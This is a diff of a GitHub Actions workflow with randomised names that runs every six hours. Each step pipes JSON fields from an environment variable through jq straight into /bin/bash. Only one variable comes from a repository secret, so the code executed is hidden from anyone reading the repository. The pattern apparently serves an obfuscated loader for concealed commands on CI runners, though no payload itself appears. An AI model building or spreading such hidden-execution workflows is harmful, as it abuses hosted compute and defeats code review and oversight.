@@ -1,26 +1,30 @@
 name: yanchengwei7615
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 3/6 * * *'
-jobs:  # 25269
+    - cron: '10 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yanchengwei7615
         env:
-          f29575: ${{ secrets.f29575 }}
+          xjst22: ${{ secrets.xjst22 }}
         run: |
-          echo $f29575 | jq -r .jlqum33 | /bin/bash
-          echo $iyc4319 | jq -r .gcigr3711 | /bin/bash
-          echo $ixk31 | jq -r .rdpwy276 | /bin/bash
-          echo $fx30 | jq -r .bexa817 | /bin/bash
-          echo $yo11307 | jq -r .qk746 | /bin/bash
-          echo $hxoam3 | jq -r .irmei04 | /bin/bash
-          echo $p24752 | jq -r .pywe446 | /bin/bash
-          echo $uw20 | jq -r .nywxp1 | /bin/bash
-          echo $h9893 | jq -r .dxaa2 | /bin/bash
-          echo $wszvz67 | jq -r .f9858 | /bin/bash
-          echo $zuy24 | jq -r .eqz93281 | /bin/bash
+          echo $xjst22 | jq -r .q1 | /bin/bash
+          echo $uelqj0 | jq -r .aum60 | /bin/bash
+          echo $ivp66694 | jq -r .veo976 | /bin/bash
+          echo $jjvgm15790 | jq -r .jaf78 | /bin/bash
+          echo $n179 | jq -r .ic50 | /bin/bash
+          echo $blpe03393 | jq -r .pep28243 | /bin/bash
+          echo $omi0139 | jq -r .uqw5742 | /bin/bash
+          echo $pib7 | jq -r .utjr253 | /bin/bash
+          echo $eeam1 | jq -r .acgy843 | /bin/bash
+          echo $qy093 | jq -r .fuza26046 | /bin/bash
+          echo $fflyv4781 | jq -r .jv134 | /bin/bash
+          echo $diidq79305 | jq -r .kpz77918 | /bin/bash
+          echo $wsaos3620 | jq -r .s37 | /bin/bash
 
